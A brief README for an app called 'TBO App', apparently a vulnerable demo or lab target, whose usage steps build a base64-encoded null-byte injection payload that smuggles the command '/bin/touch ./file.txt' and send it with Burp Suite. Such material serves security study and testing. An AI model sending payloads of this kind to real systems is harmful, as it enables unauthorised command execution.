# TBO App

## Usage
1. Create payload
`echo -ne "something\x00/bin/touch ./file.txt" | base64`
2. Use Burp Suite to send the base64-encoded payload.
